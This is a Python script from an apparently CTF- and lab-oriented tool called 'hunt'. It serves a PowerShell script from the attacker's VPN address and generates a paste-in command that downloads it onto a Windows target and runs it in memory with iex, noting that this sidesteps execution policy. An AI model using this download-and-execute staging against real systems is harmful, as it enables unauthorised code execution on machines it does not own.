#!/usr/bin/env python3
"""Stage hunt onto a target that has no internet.

One command on your attacking machine, one paste into the target. Nothing to
clone, nothing to remember:

    curl -sL https://raw.githubusercontent.com/iamjoshgilman/hunt/main/serve.py | python3 -

It fetches hunt.ps1, serves it on your VPN address, and prints the command to
paste into the target's shell. Most CTF and lab targets cannot resolve
raw.githubusercontent.com, so this is the normal way in rather than a fallback.

Why not `python3 -m http.server`:

  * that exposes every file in the working directory to the target; this
    serves one path and 404s everything else
  * it truncates large files to Windows clients at a different byte count each
    time, and a half-delivered script fails as a parse error somewhere in the
    middle rather than as a transfer problem. The generated command checks the
    byte count before it runs anything.
"""

from __future__ import annotations

import argparse
import http.server
import shutil
import socket
import subprocess
import sys
import tempfile
import urllib.request
from pathlib import Path

RAW_URL = "https://raw.githubusercontent.com/iamjoshgilman/hunt/main/hunt.ps1"
# tun0 first: the HTB and OpenVPN default, and the address a target can reach.
VPN_PREFIXES = ("tun", "tap", "wg", "ppp")
# Virtual bridges are never the address a target should call back to, and
# listing them just buries the one that matters.
NOISY_PREFIXES = ("docker", "br-", "virbr", "veth", "lo", "vmnet", "cni", "flannel")
CLIPBOARD = (["wl-copy"], ["xclip", "-selection", "clipboard"],
             ["xsel", "--clipboard", "--input"], ["pbcopy"])


def colour(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if sys.stdout.isatty() else text


def load_payload(source: str | None) -> tuple[bytes, str]:
    """The script to serve, from disk if asked, otherwise from GitHub."""
    if source:
        data = Path(source).expanduser().read_bytes()
        return data, source
    try:
        with urllib.request.urlopen(RAW_URL, timeout=30) as response:
            return response.read(), RAW_URL
    except OSError as exc:
        sys.exit(f"could not fetch {RAW_URL}: {exc}\n"
                 f"If this machine is offline too, pass --file path/to/hunt.ps1")


def local_addresses() -> list[tuple[str, str]]:
    """Every non-loopback IPv4 address, as (interface, address)."""
    found = []
    try:
        out = subprocess.run(["ip", "-o", "-4", "addr", "show"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4 and parts[2] == "inet":
                found.append((parts[1], parts[3].split("/")[0]))
    except (OSError, subprocess.SubprocessError):
        pass
    return [(nic, ip) for nic, ip in found if not ip.startswith("127.")]


def worth_showing(nic: str) -> bool:
    return not nic.startswith(NOISY_PREFIXES)


def default_route_address() -> str | None:
    """The address the OS would send from, without sending anything."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("1.1.1.1", 53))
        return probe.getsockname()[0]
    except OSError:
        return None
    finally:
        probe.close()


def pick_address(explicit: str | None) -> tuple[str, str, list[tuple[str, str]]]:
    addresses = [a for a in local_addresses() if worth_showing(a[0])]
    if explicit:
        return "specified", explicit, addresses
    for nic, ip in addresses:
        if nic.startswith(VPN_PREFIXES):
            return nic, ip, addresses
    fallback = default_route_address()
    if fallback:
        for nic, ip in addresses:
            if ip == fallback:
                return nic, ip, addresses
        return "default route", fallback, addresses
    if addresses:
        return (*addresses[0], addresses)
    return "unknown", "127.0.0.1", addresses


def free_port(preferred: int) -> int:
    probe = socket.socket()
    probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        probe.bind(("", preferred))
        return preferred
    except OSError:
        probe.close()
        probe = socket.socket()
        probe.bind(("", 0))
        return probe.getsockname()[1]
    finally:
        probe.close()


def to_clipboard(text: str) -> str | None:
    for argv in CLIPBOARD:
        if shutil.which(argv[0]):
            try:
                subprocess.run(argv, input=text.encode(), check=True, timeout=5)
                return argv[0]
            except (OSError, subprocess.SubprocessError):
                continue
    return None


def target_command(url: str, size: int, use_curl: bool) -> str:
    """The one line to paste into the target.

    Checks the byte count before running anything, so a truncated transfer
    says so instead of failing as a parse error halfway through the script.
    Nothing touches the target's disk, which also keeps it clear of execution
    policy: that applies to running a .ps1 file, not to iex of a string.
    """
    if use_curl:
        return (
            f"$f=\"$env:TEMP\\hunt.ps1\";curl.exe -s -o $f {url};"
            f"if((Get-Item $f).Length -eq {size})"
            f"{{iex(Get-Content $f -Raw);hunt}}"
            f"else{{\"TRUNCATED $((Get-Item $f).Length)/{size}\"}}"
        )
    return (
        f"$b=(New-Object Net.WebClient).DownloadData('{url}');"
        f"if($b.Length -eq {size})"
        f"{{iex([Text.Encoding]::UTF8.GetString($b));hunt}}"
        f"else{{\"TRUNCATED $($b.Length)/{size}\"}}"
    )


def make_handler(payload: bytes, path: str, state: dict):
    class Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"
        server_version = "hunt-stage"

        def do_GET(self):  # noqa: N802
            if self.path.rstrip("/") not in (path, path.rstrip("/")):
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            try:
                self.wfile.write(payload)
            except (BrokenPipeError, ConnectionResetError):
                print(colour(f"  !  {self.client_address[0]} dropped mid-transfer",
                             "33"), flush=True)
                return
            state["served"] += 1
            print(colour(f"  ok {self.client_address[0]} pulled "
                         f"{len(payload):,} bytes", "32"), flush=True)

        def log_message(self, *_args):
            """Silence the default per-request noise; do_GET reports instead."""

    return Handler


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="serve.py",
        description="Serve hunt.ps1 to a target with no internet, and print "
                    "the command to paste into it.",
    )
    parser.add_argument("--ip", help="address to advertise (default: your VPN address)")
    parser.add_argument("--port", type=int, default=8000,
                        help="port to listen on (default 8000)")
    parser.add_argument("--file", help="serve a local hunt.ps1 instead of fetching it")
    parser.add_argument("--path", help="where to save the local copy (default: a temp file)")
    parser.add_argument("--once", action="store_true",
                        help="stop after the target pulls it")
    parser.add_argument("--curl", action="store_true",
                        help="emit a curl.exe command instead of Net.WebClient")
    args = parser.parse_args(argv)

    try:
        sys.stdout.reconfigure(line_buffering=True)
    except (AttributeError, OSError, ValueError):
        pass

    payload, origin = load_payload(args.file)

    save_path = args.path or str(Path(tempfile.gettempdir()) / "hunt.ps1")
    try:
        Path(save_path).write_bytes(payload)
    except OSError as exc:
        save_path = f"(could not save: {exc})"

    nic, ip, others = pick_address(args.ip)
    port = free_port(args.port)
    path = "/hunt.ps1"
    url = f"http://{ip}:{port}{path}"
    command = target_command(url, len(payload), args.curl)

    where = "github" if origin == RAW_URL else "local file"
    print()
    print(colour("  hunt staging server", "1;36"))
    print()
    print(f"  pulled     hunt.ps1  {len(payload):,} bytes  (from {where})")
    print(f"  saved      {save_path}")
    print(f"  serving    {url}  [{nic}]")
    if port != args.port:
        print(colour(f"  note       port {args.port} was busy, using {port}", "33"))

    spare = [f"{n} {a}" for n, a in others if a != ip]
    if spare:
        print(colour(f"  others     {', '.join(spare)}   (--ip for a different one)", "2"))

    helper = to_clipboard(command)
    if helper:
        print(f"  clipboard  copied with {helper}")

    if not args.ip and not nic.startswith(VPN_PREFIXES):
        print()
        print(colour("  !  no VPN interface found, so this address is a guess.", "1;33"))
        print(colour("     If the target cannot reach it, bring the VPN up or "
                     "pass --ip.", "33"))

    print()
    print(colour("  copy this to the target:", "1;33"))
    print()
    print(colour(f"  {command}", "1;37"))
    print()
    print(colour("  waiting for the target to pull it ... ctrl-c to stop", "2"))
    print()

    state = {"served": 0}
    httpd = http.server.ThreadingHTTPServer(("", port),
                                            make_handler(payload, path, state))
    try:
        if args.once:
            while not state["served"]:
                httpd.handle_request()
        else:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        print(colour(f"  stopped after {state['served']} transfer(s)", "2"))
    finally:
        httpd.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
